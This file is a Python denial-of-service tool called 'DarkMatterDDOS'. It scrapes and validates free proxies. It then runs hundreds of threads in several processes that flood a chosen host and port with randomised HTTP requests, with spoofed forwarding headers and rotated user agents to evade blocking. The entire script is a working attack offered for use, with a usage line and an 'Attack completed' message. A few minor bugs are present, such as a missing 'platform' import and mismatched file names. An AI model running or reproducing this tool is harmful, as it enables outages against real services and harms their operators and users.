#!/usr/bin/env python3
import sys
import os
import time
import random
import socket
import socks
import ssl
import requests
import concurrent.futures
import multiprocessing
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor

# Configuration
MAX_THREADS = 500
PROCESSES = os.cpu_count() * 2
REQUEST_TYPES = ["GET", "POST", "HEAD", "PUT", "DELETE"]
PROXY_TIMEOUT = 7
DURATION = 300

# Free Proxy Sources
PROXY_SOURCES = [
    "https://api.proxyscrape.com/v3/free-proxy-list/get?request=displayproxies",
    "https://proxyscan.io/download?type=http",
    "https://proxyspace.pro/http.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
    "https://api.openproxylist.xyz/http.txt",
    "https://www.proxy-list.download/api/v1/get?type=http"
]

def get_user_agents():
    if not os.path.exists("user_agents.txt"):
        try:
            url = "https://raw.githubusercontent.com/tamimibrahim17/User-Agent/main/user_agents.json"
            agents = requests.get(url).json()
            with open("user-agents.txt", "w") as f:
                f.write("\n".join(agents))
            print("[+] Downloaded fresh user agents")
        except:
            print("[-] Using default user agents")
            return [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15"
            ]

    with open("user-agents.txt", "r") as f:
        return [line.strip() for line in f if line.strip()]

def fetch_proxies():
    proxies = set()
    print("[+] Scraping fresh proxies...")

    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = {executor.submit(requests.get, url, timeout=15): url for url in PROXY_SOURCES}
        for future in concurrent.futures.as_completed(futures):
            try:
                res = future.result()
                if res.status_code == 200:
                    proxies.update(res.text.strip().split('\n'))
            except:
                continue

    return [p.strip() for p in proxies if ':' in p and p.count(':') == 1]

def validate_proxy(proxy):
    try:
        ip, port = proxy.split(':')
        test_url = "http://example.com"

        # Test HTTP
        proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
        start = time.time()
        r = requests.get(test_url, proxies=proxies, timeout=PROXY_TIMEOUT)
        if r.status_code == 200 and (time.time() - start) < PROXY_TIMEOUT:
            return ('http', proxy)

        # Test SOCKS5
        socks.set_default_proxy(socks.SOCKS5, ip, int(port))
        socket.socket = socks.socksocket
        start = time.time()
        r = requests.get(test_url, timeout=PROXY_TIMEOUT)
        if r.status_code == 200 and (time.time() - start) < PROXY_TIMEOUT:
            return ('socks5', proxy)
    except:
        pass
    finally:
        socks.set_default_proxy(None)
        socket.socket = socket._realsocket
    return None

class DarkMatterDDOS:
    def __init__(self, target, port, use_ssl=False):
        self.target = target
        self.port = port
        self.use_ssl = use_ssl
        self.user_agents = get_user_agents()
        self.proxies = []
        self.running = True
        self.update_proxies()

    def update_proxies(self):
        raw_proxies = fetch_proxies()
        valid = []

        with ThreadPoolExecutor(max_workers=100) as executor:
            futures = [executor.submit(validate_proxy, p) for p in raw_proxies]
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result:
                    valid.append(result)

        self.proxies = valid
        print(f"[+] Loaded {len(self.proxies)} working proxies")

    def create_connection(self):
        if self.proxies:
            proxy_type, proxy = random.choice(self.proxies)
            ip, port = proxy.split(':')

            if proxy_type == 'http':
                sock = socks.socksocket()
                sock.set_proxy(socks.HTTP, ip, int(port))
            else:
                sock = socks.socksocket()
                sock.set_proxy(socks.SOCKS5, ip, int(port))
        else:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        sock.settimeout(5)
        sock.connect((self.target, self.port))

        if self.use_ssl:
            ctx = ssl.create_default_context()
            return ctx.wrap_socket(sock, server_hostname=self.target)
        return sock

    def generate_headers(self):
        return (
            f"{random.choice(REQUEST_TYPES)} /{''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))} HTTP/1.1\r\n"
            f"Host: {self.target}\r\n"
            f"User-Agent: {random.choice(self.user_agents)}\r\n"
            f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
            f"X-Forwarded-For: {'.'.join(str(random.randint(0,255)) for _ in range(4))}\r\n"
            f"CF-Connecting-IP: {'.'.join(str(random.randint(0,255)) for _ in range(4))}\r\n"
            f"Connection: keep-alive\r\n\r\n"
        ).encode()

    def attack(self):
        while self.running:
            try:
                conn = self.create_connection()
                payload = self.generate_headers()

                for _ in range(random.randint(50, 100)):
                    conn.send(payload)
                    time.sleep(0.01)

                conn.close()
            except:
                pass

    def start(self):
        with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
            futures = [executor.submit(self.attack) for _ in range(MAX_THREADS)]
            time.sleep(DURATION)
            self.running = False
            for future in futures:
                future.cancel()

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <target> <port> [--ssl]")
        sys.exit(1)

    if platform.system() == "Linux":
        os.system("ulimit -n 999999 && sysctl -w net.ipv4.tcp_max_syn_backlog=65535")

    target = sys.argv[1]
    port = int(sys.argv[2])
    ssl_flag = "--ssl" in sys.argv

    print(f"[+] Starting DarkMatter DDoS against {target}:{port}")

    processes = []
    for _ in range(PROCESSES):
        ddos = DarkMatterDDOS(target, port, ssl_flag)
        p = multiprocessing.Process(target=ddos.start)
        p.start()
        processes.append(p)

    for p in processes:
        p.join()

    print("[+] Attack completed")